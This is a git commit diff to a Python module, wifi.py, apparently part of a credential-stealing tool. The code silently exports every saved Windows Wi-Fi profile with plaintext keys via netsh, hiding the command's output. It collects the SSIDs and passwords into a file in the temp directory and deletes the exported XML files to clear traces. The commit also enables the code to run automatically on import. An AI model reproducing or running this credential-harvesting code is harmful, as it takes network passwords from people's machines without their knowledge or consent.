6eb4c3db9b7aec4eb9691fd212819f985addfd3d
Josakko <112590914+Josakko@users.noreply.github.com>
2023-06-17 19:14:15 +0200

    Update wifi.py

--- modules/wifi.py
+++ modules/wifi.py
@@ -5,7 +5,7 @@ import os
 
 class WifiPasswords:
     def __init__(self):
-        #self.password_file = open("wifi.txt", "w", encoding="utf-8")
+        #self.password_file = open(f"{os.getenv('temp')}\\wifi.txt", "w", encoding="utf-8")
         #self.password_file.write(f"Password List for: {socket.gethostname()}, {socket.gethostbyname(socket.gethostname())}: \n")
         #self.password_file.close()
 
@@ -14,19 +14,27 @@ class WifiPasswords:
         self.password = []
 
         #subprocess.run("netsh wlan export profile key=clear", capture_output=True).stdout.decode()
+        cwd = os.getcwd()
+        self.path = os.getenv("temp")
+        os.chdir(self.path)
         subprocess.run("netsh wlan export profile key=clear", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-        self.path = os.getcwd()
+        os.chdir(cwd)
+        #self.path = os.getcwd()
 
     def get_files(self):
         for file_name in os.listdir(self.path):
-            if file_name.startswith("Wi-Fi") and file_name.endswith(".xml"):
-                self.files.append(file_name)
+            if file_name.startswith("Wi-Fi-") and file_name.endswith(".xml"):
+                self.files.append(f"{self.path}\\{file_name}")
 
     def write(self):
-        with open("wifi.txt", "a", encoding="utf-8") as file:
+        if os.path.exists(self.path):
+            try: os.remove(f"{os.getenv('temp')}\\wifi.txt")
+            except: pass
+            
+        with open(f"{os.getenv('temp')}\\wifi.txt", "a", encoding="utf-8") as f0:
             written_ssid = set()
-            for i in self.files:
-                with open(i, "r") as f:
+            for file in self.files: 
+                with open(file, "r") as f:
                     for line in f.readlines():
                         if "name" in line:
                             stripped = line.strip()
@@ -41,9 +49,9 @@ class WifiPasswords:
                             if self.ssid and back and self.ssid[-1] not in written_ssid:
                                 written_ssid.add(self.ssid[-1])
                                 self.password.append(back)
-                                file.write(f"SSID: {self.ssid[-1]} Password: {self.password[-1]}\n")
+                                f0.write(f"SSID: {self.ssid[-1]} Password: {self.password[-1]}\n")
                 try:
-                    os.remove(i)
+                    os.remove(file)
                 except:
                     pass
 
@@ -55,5 +63,5 @@ class WifiPasswords:
             pass
 
 
-#wifi = WifiPasswords()
-#wifi.run()
+wifi = WifiPasswords()
+wifi.run()
